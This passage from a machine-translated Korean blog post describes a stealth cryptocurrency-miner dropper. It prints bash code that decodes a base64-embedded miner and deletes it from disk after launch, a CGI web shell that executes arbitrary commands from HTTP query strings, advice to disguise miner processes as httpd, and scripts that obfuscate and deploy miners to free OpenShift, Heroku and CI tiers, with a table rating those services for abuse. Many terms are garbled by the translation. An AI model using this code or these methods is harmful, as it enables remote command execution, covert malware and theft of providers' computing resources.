}</code></pre><p> 이렇게 하면 한 줄만 편집할 수 있습니다. 여러 줄 항목의 경우 첫 번째 줄만 고려합니다. 하지만 우리의 사용 사례에는 충분합니다.</p><h2 id="runtime"><a class="header-anchor" href="#runtime"> 실행 시간</a></h2><p> 우리의 런타임은 어떻게 생겼습니까? 메인 루프를 실행하는 메인 bash 프로세스가 있고, 그 다음 광부 하위 프로세스, CPU 모니터 하위 프로세스, 보관함 및 튜너가 있습니다. 거의 소수입니다.</p><p> 먼저 우리는 무언가 잘못되었을 때 혼란을 남기지 않도록 하고 싶습니다. 이것은 종료 시 정리를 수행하기 위해 bash 트랩을 사용한다는 것을 의미합니다.</p><pre><code class="bash hljs"><span class="hljs-built_in">trap</span><span class="hljs-string">"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &amp;&gt;/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code>  재귀를 방지하기 위해 트랩을 해제합니다. 트랩은 모든 작업을 종료하고 작업 환경을 제거합니다.</p><p> base64 인코딩에서 bash 변수로 저장되는 광부를 시작할 때입니다. 파일 시스템에 덤프한 다음 구성을 덤프하고 광부를 실행하고 광부와 구성을 모두 제거합니다. Linux에서는 실행 중인 프로세스의 실행 파일을 제거할 수 있습니다(Windows에서는 허용되지 않음).<sup id="fnref:memoryondemand"><a class="fnref" href="#fndef:memoryondemand">[8]</a></sup>  광부가 실행 중일 때 파일 시스템에는<code>.. /</code>  디렉토리<code>b64</code>  그 안에 링크.</p><pre><code class="bash hljs"><span class="hljs-comment">## put a file $1 into a var $2</span><span class="hljs-function"><span class="hljs-title">fileToVar</span></span>(){
    <span class="hljs-built_in">declare</span> -n tmpd=<span class="hljs-string">"<span class="hljs-variable">$2</span>"</span> &amp;&amp; tmpd=$(b64e <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>) &amp;&amp; <span class="hljs-built_in">return</span><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">$tmpd</span>"</span> ]; <span class="hljs-keyword">then</span><span class="hljs-built_in">log</span><span class="hljs-string">"gobbling in array"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"<span class="hljs-variable">$2</span>=1"</span><span class="hljs-comment">## avoid empty checks</span>
        gobbled[<span class="hljs-variable">$2</span>]=$(b64e <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span>)
    <span class="hljs-keyword">else</span><span class="hljs-built_in">return</span> 1 <span class="hljs-comment">## do not quote assignment otherwise ram is not released</span><span class="hljs-keyword">fi</span>
}
<span class="hljs-comment">## put a var $1 into a file $2</span><span class="hljs-function"><span class="hljs-title">varToFile</span></span>(){
    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$VERBOSE</span>"</span> ]; <span class="hljs-keyword">then</span><span class="hljs-keyword">if</span><span class="hljs-built_in">declare</span> -n 2&gt;&gt;<span class="hljs-variable">${VERBOSE}</span> &amp;&amp; <span class="hljs-built_in">eval</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\$<span class="hljs-variable">$1</span>\" 1&gt;\"<span class="hljs-variable">$2</span>\" 2&gt;&gt;<span class="hljs-variable">${VERBOSE}</span>"</span>; <span class="hljs-keyword">then</span><span class="hljs-built_in">return</span><span class="hljs-keyword">else</span><span class="hljs-comment"># log "dumping from array"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\${gobbled[<span class="hljs-variable">$1</span>]}\" 1&gt;\"<span class="hljs-variable">$2</span>\" 2&gt;&gt;<span class="hljs-variable">${VERBOSE}</span>"</span> &amp;&amp; <span class="hljs-built_in">return</span><span class="hljs-keyword">fi</span><span class="hljs-built_in">return</span> 1
    <span class="hljs-keyword">else</span><span class="hljs-keyword">if</span><span class="hljs-built_in">declare</span> -n &amp;&amp; <span class="hljs-built_in">eval</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\$<span class="hljs-variable">$1</span>\" &gt;\"<span class="hljs-variable">$2</span>\""</span>; <span class="hljs-keyword">then</span><span class="hljs-built_in">return</span><span class="hljs-keyword">else</span><span class="hljs-comment"># log "dumping from array"</span><span class="hljs-built_in">eval</span><span class="hljs-string">"b64d &lt;&lt;&lt;\"\${gobbled[<span class="hljs-variable">$1</span>]}\" &gt;\"<span class="hljs-variable">$2</span>\""</span> &amp;&amp; <span class="hljs-built_in">return</span><span class="hljs-keyword">fi</span><span class="hljs-built_in">return</span> 1
    <span class="hljs-keyword">fi</span>
}</code></pre><p>광부를 인코딩하는 동안 bash에서 발생하는 미친 기이한 문제는 따옴표가 있는 서브쉘이 있는 변수를 할당하는 것입니다.<code>myvar="$(something)"</code>  메모리 사용량이 영구적으로 증가합니다. 이것은 디버그하기가 어려웠고 실제로 왜 이와 같이 동작하는지 이유를 찾지 못했습니다. 어쨌든 할당은 인용 해제되어야 합니다. 대신 디코딩은 다음과 같이 수행됩니다.<em> 이단</em>  이는 임시 파일에 대한 추상화이며 변수는 파일에 덤프된 다음 프로세스로 다시 파이프됩니다.</p><p> 광부 장기 실행 루프:</p><ul><li><p> 사실 동안</p><ul><li><p> 광부를 중지</p></li><li><p> 구성 제거</p></li><li><p> 광부 시작</p></li><li><p> 사실 동안</p><ul><li><p> 시작 데몬</p><ul><li><p> 광부가 실행되는 동안</p><ul><li><p> 광부의 출력 읽기</p></li><li><p> 출력 라인을 기반으로 광부 작업 선택</p></li></ul></li></ul></li><li><p> 광부가 실행되고 있지 않은 경우: break</p></li></ul></li><li><p> 잠</p></li></ul></li></ul><p> 출력 라인은 일부 정규식과 일치합니다.</p><pre><code class="bash hljs">act_rgx=<span class="hljs-string">'(accepted|speed|paused|algo:|-&gt; update config|-&gt; publish config|-&gt; trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p> 데몬은 다음과 같은 경우를 처리합니다.</p><ul><li><p> 끝점에 연결하면 오류가 발생합니다(새 임의 끝점 선택).</p></li><li><p> 해싱 알고리즘 변경(수면 시간 및 임시 구성 조정)</p></li><li><p> 광부 문제(광부를 다시 시작).</p></li></ul><p> 잠시 동안 수동 재시작을 트리거할 수 있는 명령 및 제어 대시보드에 대한 지원이 있었지만 사용량이 최소화되어 폐기되고 엔드포인트가 대체 풀 연결로 대체되었으며 재시작 프로세스도 불안정하고 복잡했습니다. ..기술 부채의 또 다른 사례. 그러나 업데이트된 페이로드를 다시 가져오고 즉석에서 모든 구성을 재설정할 수 있었습니다. 이는 매우 멋진 궁극의 트램펄린이었습니다.</p><h2 id="debugging"><a class="header-anchor" href="#debugging"> 디버깅</a></h2><p> 세 가지 주요 유틸리티가 있습니다</p><ul><li><p> 코드 블록에 대한 추적 활성화/비활성화(변수에서 b64로 인코딩된 바이너리를 추적하고 싶지 않습니다.)</p></li><li><p> 로그 포맷을 위한 간단한 기능</p></li><li><p>광부가 시작될 때마다 런타임에 자세한 로깅을 활성화하는 플래그입니다.</p><ul><li><p> 파일을<code>.debug</code>  존재하다?</p><ul><li><p> 자세한 로깅 활성화</p></li></ul></li></ul></li></ul><h2 id="target_deployments"><a class="header-anchor" href="#target_deployments"> 대상 배포</a></h2><p> 이 설정은 3가지 종류의 호스트에서 테스트되었습니다.</p><h3 id="self_hosted_containers_or_vms"><a class="header-anchor" href="#self_hosted_containers_or_vms"> 자체 호스팅 컨테이너 또는 VM</a></h3><p> CPU 리소스는 여러 사용자 간에 공유되는 경향이 있고 마이닝 소프트웨어는 나머지 사용자의 성능에 영향을 미치는 호스트 노드의 속도를 쉽게 늦출 수 있기 때문에 많은 호스팅 제공업체는 마이닝을 좋아하지 않습니다. 이는 CPU 사용자 시간이 무제한인 경우에도 마찬가지입니다. 캐시가 모든 CPU 코어 간에 공유되는 경우 해싱 알고리즘이 CPU의 모든 캐싱 계층을 포화시킬 수 있기 때문입니다.</p><p> 우리는 우리의<em> 공정한</em>  금지되지 않고 리소스를 공유하는 것은 호스트 사용을 인식하므로 스텔스 드로퍼의 좋은 사용 사례입니다.<em> ~해야한다</em>  [AUP] 안에 머무르십시오. 자체 호스팅 배포를 처리할 때 추가 단계는 없으며 시작 관리자 스크립트만 부팅 시퀀스에 추가하거나 수동으로 시작할 수 있습니다.</p><h3 id="cpanel_based_web_hosting"><a class="header-anchor" href="#cpanel_based_web_hosting"> cPanel 기반 웹 호스팅</a></h3><p> 웹 호스팅 구독 계획은 주로 [cPanel]을 통해 제공됩니다. 다시 여기서 우리는 합리적인 리소스 제한이 있는 개인 구독 계획을 사용하고 있습니다. 반면에 모든 무료 계획에는 말도 안되는 제한이 있습니다.<sup id="fnref:freehostinglimits"><a class="fnref" href="#fndef:freehostinglimits">[9]</a></sup> . cPanel을 사용하면 다양한 파일 확장자에 대한 핸들러를 정의할 수 있습니다. 이를 통해 쉘 스크립트를 실행할 수 있습니다.<a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface"> CG</a>  서버에 업로드된 셸 스크립트에 대한 http 요청으로. 이러한 종류의 인터페이스는 웹쉘의 모습입니다.<sup id="fnref:cpanelssh"><a class="fnref" href="#fndef:cpanelssh">[10]</a></sup> . 간단한 bash 웹 셸</p><pre><code class="bash hljs"><span class="hljs-comment"># without content encoding the request response won't be honored</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class="hljs-comment">## parse vars (for interactive use)</span>
saveIFS=<span class="hljs-variable">$IFS</span>
IFS=<span class="hljs-string">'=&amp;'</span>
parm=(<span class="hljs-variable">$QUERY_STRING</span>)
IFS=<span class="hljs-variable">$saveIFS</span><span class="hljs-keyword">for</span> ((i=0; i&lt;<span class="hljs-variable">${#parm[@]}</span>; i+=2))
<span class="hljs-keyword">do</span><span class="hljs-built_in">declare</span> var_<span class="hljs-variable">${parm[i]}</span>=<span class="hljs-variable">${parm[i+1]}</span><span class="hljs-keyword">done</span><span class="hljs-comment">## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class="hljs-string">"<span class="hljs-variable">${var_path//+/ }</span>"</span><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">".:<span class="hljs-variable">$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &amp;&gt;/dev/null

<span class="hljs-keyword">if</span><span class="hljs-built_in">declare</span> -f <span class="hljs-string">"<span class="hljs-variable">${url_encoded/\%20*}</span>"</span> 1&gt;/dev/null; <span class="hljs-keyword">then</span><span class="hljs-comment">## don't use -n, redirect fd for bcompat</span><span class="hljs-built_in">printf</span><span class="hljs-string">'%b'</span><span class="hljs-string">"<span class="hljs-variable">${url_encoded//%/\\x}</span>"</span> &gt; /tmp/<span class="hljs-variable">${SERVER_NAME}</span>.src
<span class="hljs-keyword">else</span><span class="hljs-keyword">if</span><span class="hljs-built_in">builtin</span><span class="hljs-string">"<span class="hljs-variable">${url_encoded/\%20*}</span>"</span>; <span class="hljs-keyword">then</span><span class="hljs-built_in">printf</span><span class="hljs-string">'%b'</span><span class="hljs-string">"<span class="hljs-variable">${url_encoded//%/\\x}</span>"</span> &gt; /tmp/<span class="hljs-variable">${SERVER_NAME}</span>.src
    <span class="hljs-keyword">else</span><span class="hljs-built_in">printf</span><span class="hljs-string">'exec %b'</span><span class="hljs-string">"<span class="hljs-variable">${url_encoded//%/\\x}</span>"</span> &gt; /tmp/<span class="hljs-variable">${SERVER_NAME}</span>.src
    <span class="hljs-keyword">fi</span><span class="hljs-keyword">fi</span>
. /tmp/<span class="hljs-variable">${SERVER_NAME}</span>.src</code></pre><p> 웹 감옥에서 추가 프로세스를 포크하는 것이 허용되지 않을 수 있으므로 내장 기능에만 의존하는 것이 좋지만 항상 가능합니다.<code>exec</code>  대부분의 명령줄 유틸리티를 사용할 수 있습니다. 대부분의 웹 셸은 포크에 대해 걱정할 필요가 없기 때문에 python 또는 php와 같은 다른 스크립팅 언어로 작성됩니다.</p><p> cpanel 환경에서는 다음과 같이 광부 프로세스에 정적 이름을 사용하는 것이 좋습니다.<code>httpd</code>  또는<code>php-fpm</code>  왜냐하면<code>cgi</code>  다중 처리를 기반으로 하므로 서버는 항상 이와 같은 이름의 많은 프로세스로 채워지지만 주의 깊은 관찰자는 주의해야 합니다.<em> 다중 스레드</em>  perl, php, ruby ​​또는 python과 같은 언어에서 확실히 일반적이지 않은(또는 가능하지 않은) 사용 패턴입니다!</p><p> 프로세스에는 기본적으로 시간 제한이 있습니다(1시간, 1일 등). 이를 위해 드로퍼를 다시 시작하는 cron 작업만 사용합니다.</p><p> 이것은 많은 수동 편집을 필요로 했으며, 이를 자동화하는 cpanel API는 불행히도 최종 사용자에게 노출되지 않으므로 웹 호스팅은 우리 광부 드롭퍼에게 투박하고 지루한 대상입니다.</p><h3 id="web_environments"><a class="header-anchor" href="#web_environments"> 웹 환경</a></h3><p> 있다<em> SaaS</em>  컨테이너와 결합된 웹 편집기가 있는 공급자(예:<a href="with a free tier before getting acquired by amazon"> 클라우드 9</a> , [코드애니웨어], [코덴비]. 여기에 드로퍼를 배포하는 것은 쉽지만(완전한 환경이 있음) 실행 상태를 유지하는 것은 부담이 됩니다. 모든 대화형 웹 편집기는 웹 페이지가 닫힌 직후 세션을 종료하고 결과적으로 컨테이너가 절전 모드로 전환되기 때문입니다. 물론 지불).</p><p>이를 우회하는 것은 세션을 열어 두어야 한다는 것을 의미할 수 있습니다. [puppeteer]를 사용한 일부 스크립팅은 원하는 결과를 얻었지만 오래 실행되고 메모리 누수가 발생하고 부풀려진 SPA 웹 페이지는 확실히 매력적이지 않고 은밀하지 않습니다. 연중무휴로 열린 세션은 확실히 의심스러워 보일 것입니다. 실제로 웹 환경도 투박하고 지루한 대상입니다.</p><h3 id="free_apps_services"><a class="header-anchor" href="#free_apps_services"> 무료 앱 서비스</a></h3><p> 이것은 주로<a href="when it used to have a free tier"> 오픈 시프트</a><sup id="fnref:openshift"><a class="fnref" href="#fndef:openshift">[11]</a></sup>  그리고 [헤로쿠]. Kubernetes인 Openshift는 배포하기가 다소 간단했지만 구성 변동으로 가득 차 있습니다.</p><pre><code class="sh hljs"><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span>

[ -z <span class="hljs-string">"<span class="hljs-variable">$OC_PRJ</span>"</span> ] &amp;&amp; { <span class="hljs-built_in">echo</span><span class="hljs-string">"no account data provided"</span>; <span class="hljs-built_in">exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class="hljs-variable">$obfs</span> ] ||
    { <span class="hljs-built_in">echo</span><span class="hljs-string">"obfs utility not found!"</span>; <span class="hljs-built_in">exit</span> 1; }
launcher=~/launcher
[ -f <span class="hljs-variable">$launcher</span> ] ||
    { <span class="hljs-built_in">echo</span><span class="hljs-string">"launcher script not found!"</span>; <span class="hljs-built_in">exit</span> 1; }

ctroot=<span class="hljs-variable">${CT_ROOT_DIR:-oc-ct-box-mine}</span><span class="hljs-comment">## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class="hljs-string">"rootfs/etc/services.d/app/run"</span>
TYPE=<span class="hljs-variable">${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class="hljs-variable">$OC_PRJ</span>/<span class="hljs-variable">$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class="hljs-string">"#!/usr/bin/with-contenv bash
"</span><span class="hljs-comment">## beware the newline ^^^</span><span class="hljs-built_in">cd</span><span class="hljs-variable">$ctroot</span> || { <span class="hljs-built_in">echo</span><span class="hljs-string">"couldn't find ct build directory"</span>; <span class="hljs-built_in">exit</span> 1; }

VARS=$(cat vars) || { <span class="hljs-built_in">echo</span><span class="hljs-string">'vars file empty!'</span>; }
VARS=<span class="hljs-variable">${VARS//$'\n'/ }</span>
VARS=<span class="hljs-variable">${VARS//\\/\\\\}</span><span class="hljs-comment">## preserve escapes</span>
script=$(cat <span class="hljs-variable">$launcher</span> | tail +2 | sed -r <span class="hljs-string">'/^echo "export \\$/a '</span><span class="hljs-string">"<span class="hljs-variable">$VARS</span>"</span><span class="hljs-string">' \\'</span>)
cat &lt;&lt;&lt; <span class="hljs-string">"<span class="hljs-variable">$script</span>"</span> &gt; <span class="hljs-variable">$tspath</span><span class="hljs-variable">$obfs</span><span class="hljs-variable">$tspath</span>
[ -z <span class="hljs-string">"<span class="hljs-variable">${tspath}</span>.obfs"</span> ] &amp;&amp; { <span class="hljs-built_in">echo</span><span class="hljs-string">"obfs file not found?"</span>; <span class="hljs-built_in">exit</span> 1; }
cat &lt;&lt;&lt; <span class="hljs-string">"$prepend<span class="hljs-subst">$(cat <span class="hljs-string">"<span class="hljs-variable">${tspath}</span>.obfs"</span>)</span>"</span> &gt; <span class="hljs-variable">$scriptpath</span><span class="hljs-built_in">exec</span> itself (should <span class="hljs-built_in">eval</span>)
chmod +x <span class="hljs-variable">$scriptpath</span>

docker build -t <span class="hljs-variable">$IMG</span>  . || <span class="hljs-built_in">exit</span> 1
<span class="hljs-built_in">cd</span> -
oc-push-image <span class="hljs-string">"<span class="hljs-variable">$IMG</span>"</span></code></pre><p> 이것은 yaml 템플릿이 필요한 마이닝 컨테이너를 빌드하는 데 사용된 스크립트입니다.</p><pre><code class="yaml hljs"><span class="hljs-attr">apiVersion:</span><span class="hljs-string">build.openshift.io/v1</span><span class="hljs-attr">kind:</span><span class="hljs-string">BuildConfig</span><span class="hljs-attr">metadata:</span><span class="hljs-attr">labels:</span><span class="hljs-attr">build:</span><span class="hljs-string">${OC_APP}</span><span class="hljs-attr">name:</span><span class="hljs-string">${OC_APP}</span><span class="hljs-attr">spec:</span><span class="hljs-attr">activeDeadlineSeconds:</span><span class="hljs-number">5184000</span><span class="hljs-attr">failedBuildsHistoryLimit:</span><span class="hljs-number">0</span><span class="hljs-attr">successfulBuildsHistoryLimit:</span><span class="hljs-number">0</span><span class="hljs-attr">resources:</span><span class="hljs-attr">limits:</span><span class="hljs-attr">cpu:</span><span class="hljs-number">2</span><span class="hljs-attr">memory:</span><span class="hljs-string">1Gi</span><span class="hljs-attr">runPolicy:</span><span class="hljs-string">Serial</span><span class="hljs-attr">source:</span><span class="hljs-attr">type:</span><span class="hljs-string">Binary</span><span class="hljs-attr">strategy:</span><span class="hljs-attr">sourceStrategy:</span><span class="hljs-attr">from:</span><span class="hljs-attr">kind:</span><span class="hljs-string">ImageStreamTag</span><span class="hljs-attr">name:</span><span class="hljs-string">${OC_APP}-build:latest</span><span class="hljs-attr">namespace:</span><span class="hljs-string">${OC_PRJ}</span><span class="hljs-attr">type:</span><span class="hljs-string">Source</span><span class="hljs-attr">template:</span><span class="hljs-attr">activeDeadlineSeconds:</span><span class="hljs-number">2400</span><span class="hljs-attr">triggers:</span><span class="hljs-bullet">-</span><span class="hljs-attr">generic:</span><span class="hljs-attr">secretReference:</span><span class="hljs-attr">name:</span><span class="hljs-string">${OC_APP}</span><span class="hljs-attr">type:</span><span class="hljs-string">Generic</span></code></pre><p> 그러나 전체 프로세스에는 상당히 많은 단계가 필요했습니다!</p><pre><code class="sh hljs"><span class="hljs-comment">## init</span>
[ -z <span class="hljs-string">"<span class="hljs-variable">$OC_APP</span>"</span> ] &amp;&amp; <span class="hljs-built_in">export</span> $(&lt;$(tfi))
[ -z <span class="hljs-string">"<span class="hljs-variable">$OC_APP</span>"</span> ] &amp;&amp; { . ./choose-creds || <span class="hljs-built_in">exit</span> 1; }
oc-login
oc new-project <span class="hljs-variable">$OC_PRJ</span> || { [ -z <span class="hljs-string">"<span class="hljs-subst">$(oc get projects)</span>"</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 1; }
oc new-app <span class="hljs-variable">$OC_APP</span> --allow-missing-images || <span class="hljs-built_in">exit</span> 1

<span class="hljs-comment">## build box with docker and push</span><span class="hljs-comment"># oc-docker-login || exit 1</span>
oc-build-mine || <span class="hljs-built_in">exit</span> 1

<span class="hljs-comment">## create dc config</span><span class="hljs-built_in">export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class="hljs-built_in">exit</span> 1
rtr=0
<span class="hljs-keyword">while</span> [ <span class="hljs-variable">$rtr</span> -lt 10 ]; <span class="hljs-keyword">do</span>
  oc rollout latest <span class="hljs-variable">$OC_APP</span> &amp;&amp; <span class="hljs-built_in">break</span>
  rtr=$((rtr+<span class="hljs-number">1</span>))
  <span class="hljs-built_in">read</span> -t 1
<span class="hljs-keyword">done</span><span class="hljs-built_in">exit</span><span class="hljs-comment">## builds</span>
bash -x oc-build-build || <span class="hljs-built_in">exit</span> 1
bash -x oc-build-template || <span class="hljs-built_in">exit</span> 1
oc start-build <span class="hljs-variable">$OC_APP</span> || <span class="hljs-built_in">exit</span> 1

accounts=<span class="hljs-variable">${ACCOUNTS_DIR:-accounts_queue}</span>
mv <span class="hljs-variable">$accounts</span>/<span class="hljs-variable">${OC_USR}</span>{\.this,\.$(date +%s)}</code></pre><p> 의사 코드에서:</p><ul><li><p> 프로젝트를 생성</p></li><li><p> 이미지 없이 애플리케이션 만들기</p></li><li><p> 광산 컨테이너를 구축</p></li><li><p> 배포 구성으로 컨테이너 배포(kubernetes 추상화)</p></li><li><p> 배포를 롤아웃</p></li></ul><p> NS<code>build-build</code>  대신 스크립트가<em> 짓다</em>  한 번에 몇 시간 동안 채굴할 수 있는 컨테이너입니다. 빌드와 일반 포드는 오픈시프트에서 별도의 리소스를 가지고 있으므로 두 가지를 모두 활용했습니다. Openshift는 4가지 다른 릴리스(아마도 더 많은 것, 잠시 후 추적을 중단함)를 거쳐서 전반적으로 나쁜 경험이었고 각 릴리스에는 구성 변경이 필요했으며 업그레이드 경로가 없었으며 모든 것이 빠르게 반복되었으며 일반적이었습니다. 빌드/포드가 중단되고 가비지 수집이 되지 않는 경우... 일반적으로 가끔씩 수동 재시작을 실행했습니다. 아마도 kubernetes가 버그였을 것입니다. :)</p><p> Heroku 구성은 조금 더 간단했습니다(kubernetes를 포함하지 않음). openshift와 유사한 컨테이너 빌드를 제외하고 나머지는 두 개의 cli 명령이었습니다.</p><pre><code class="bash hljs">heroku config:<span class="hljs-built_in">set</span> HRK_APP=<span class="hljs-variable">$HRK_APP</span> -a <span class="hljs-variable">$HRK_APP</span>
heroku container:release -a <span class="hljs-variable">$HRK_APP</span><span class="hljs-variable">$TYPE</span></code></pre><p> 컨테이너는 도커를 사용하여 heroku 레지스트리로 직접 푸시되었습니다.<sup id="fnref:herokucontainers"><a class="fnref" href="#fndef:herokucontainers">[12]</a></sup>  heroku(프리 티어가 작성 시점까지 계속 유지됨)와의 마찰은 dynos가 한 달에 22일 동안만 실행될 수 있으므로 매달 약간의 수동 관리가 필요하다는 것입니다. 그들은 처음에 몇 가지 금지 웨이브를 실행한 다음 TOR를 통해 등록을 비활성화했습니다. 나는 이것이 원인이라고 확신합니다.</p><h3 id="ci_containers_or_vms"><a class="header-anchor" href="#ci_containers_or_vms"> CI 컨테이너 또는 VM</a></h3><p>이것들은 우리 dropper의 가장 시너지 효과가 있는 표적이었습니다. 많이있다<a href="https://en.wikipedia.org/wiki/Continuous_integration"> CI</a>  많은 회사들이 기술 인프라 사업에서 시장 점유율을 얻기 위해 무료 계층을 제공하는 투자자들에게 돈을 불태우고 있습니다.</p><p> 이러한 모든 서비스는 서로 다른 리소스를 제공하고 서로 다른 구성 요구 사항을 가지며 서로 다른 환경에서 실행됩니다. 자동화 계정 등록은 프로그래밍이 끔찍해서 한 번도 생각해 본 적이 없고, 항상 피하려고 노력하기 때문에 어떤 스팸 방지 응답을 받을지 궁금하여 한동안 수동 등록을 참았습니다(그리고 나머지와 얼마나 다른지!). 스팸을 처리하는 방법에서 회사 관리에 대해 몇 가지 추측할 수 있습니다.</p><ul><li><p> 금지 웨이브를 수행합니까? 그런 다음 그들은 엄격하지 않은 정책을 가지고 있으며 문제는 수동으로 사례별로 처리됩니다.</p></li><li><p> 전화 인증이 필요합니까? 그들은 이미 과거에 학대를 받았다.</p></li><li><p> 리소스 사용량이 많을 때 응답합니까? 그들은 빠듯한 예산으로 운영되고 있습니다</p></li><li><p> 그들은 계정 제한 또는 그림자 금지를 적용합니까? 섀도우 밴이라면 시스템 관리자를 의미합니다.</p></li></ul><p> 철학적인 질문도 있습니다. 서비스에서 시스템을 오랫동안 남용할 수 있다면 부하를 처리할 수 있는 최첨단 인프라가 있다는 의미입니까, 아니면 단순히 시스템을 제대로 제어하지 못한다는 의미입니까? 그리고 접근성과 보안 사이의 균형을 고려해야 합니다. 시스템이 너무 안전하면 사용자 유지가 낮아질 수 있습니다.</p><p> 다음은 내가 배포한 일부 서비스를 보여주는 표입니다.</p><table><tbody><tr class="header headerLastRow"><th style="text-align: center;"> 시</th><th style="text-align: center;"> 구성</th><th style="text-align: center;"> 성능</th><th style="text-align: center;"> 해머</th></tr><tr><td style="text-align: center;"> 비트라이즈</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: yellow; text-align: center;"> 중간</td></tr><tr><td style="text-align: center;"> 트래비스</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: green; text-align: center;"> 좋은</td></tr><tr><td style="text-align: center;"> 코드십</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: yellow; text-align: center;"> 중간</td></tr><tr><td style="text-align: center;"> Gitlab</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: green; text-align: center;"> 좋은</td></tr><tr><td style="text-align: center;">서클시</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: yellow; text-align: center;"> 중간</td></tr><tr><td style="text-align: center;"> 신호기</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: yellow; text-align: center;"> 중간</td></tr><tr><td style="text-align: center;"> 도커</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: green; text-align: center;"> 좋은</td></tr><tr><td style="text-align: center;"> 부두</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: yellow; text-align: center;"> 중간</td></tr><tr><td style="text-align: center;"> 코드프레시</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: yellow; text-align: center;"> 중간</td></tr><tr><td style="text-align: center;"> 베르커</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: red; text-align: center;"> 나쁜</td></tr><tr><td style="text-align: center;"> Azure 파이프라인</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: red; text-align: center;"> 나쁜</td></tr><tr><td style="text-align: center;"> 연속 PHP</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: yellow; text-align: center;"> 중간</td></tr><tr><td style="text-align: center;"> 친구</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: red; text-align: center;"> 나쁜</td></tr><tr><td style="text-align: center;"> 무인 비행기</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: red; text-align: center;"> 나쁜</td></tr><tr><td style="text-align: center;"> 앱베이어</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: yellow; text-align: center;"> 중간</td><td style="color: red; text-align: center;"> 나쁜</td></tr><tr><td style="text-align: center;"> 네버코드</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: yellow; text-align: center;"> 중간</td></tr><tr><td style="text-align: center;"> 자이스트/베르셀</td><td style="color: red; text-align: center;"> 나쁜</td><td style="color: green; text-align: center;"> 좋은</td><td style="color: red; text-align: center;"> 나쁜</td></tr></tbody></table><p> 이러한 맥락에서,<span style="color: green">  좋은</span>  구성은 구성하는 데 많은 시간이 걸리지 않았음을 의미합니다.<code>ci</code>  마이닝 프로세스를 위한 작업(리포지토리 도트 파일 대신 웹 대시보드에 의존하는 모든 서비스가 잡일이었습니다),<span style="color: red">  나쁜</span><code>ban-hammer</code>  서비스에 등록하기 어렵거나 계정이 더 적극적으로 차단될 수 있음을 의미합니다.</p><p><a href="https://web.archive.org/web/20210222050951/https://www.bitrise.io/"> 비트라이즈</a>  환경, 대상 아키텍처, 실행 프로세스 및 기타 사항을 추론하기 위해 프로젝트를 설정해야 하므로 빌드를 설정하는 데 시간이 많이 소요되어 구성에서 나쁜 평가를 받았습니다.<a href="https://web.archive.org/web/20210310010750/https://continuousphp.com/"> 연속 PHP</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/"> 친구</a> , [Codefresh]에도 수동 비선언적 구성 단계가 많이 있었습니다.</p><p> [Azure-pipelines]와 같은 서비스,<a href="https://web.archive.org/web/20210308202144/https://app.wercker.com/"> 베르커</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/"> 친구</a>  계정에 그림자 금지를 적용하면 구성에 문제가 있는지 여부를 추측할 수 있으므로 그림자 금지가 좋지 않습니다. 일부 서비스에서는 금지 이유를 추측할 수 있습니다(빌드에 시간이 너무 오래 걸리거나 단기간에 너무 많이 빌드함). [Azure-pipelines]와 같은 일부 서비스의 경우 일종의 지문을 적용했다고 가정합니다. 리소스 남용 없이도 금지가 진행됨에 따라 사용자 리포지토리에 azure 및 vercel도 제한되었습니다.<code>DNS</code>  공개 빌드 머신 내에서 액세스할 수 있기 때문에 애드혹 터널로 극복해야 하는 추가적인 마찰이 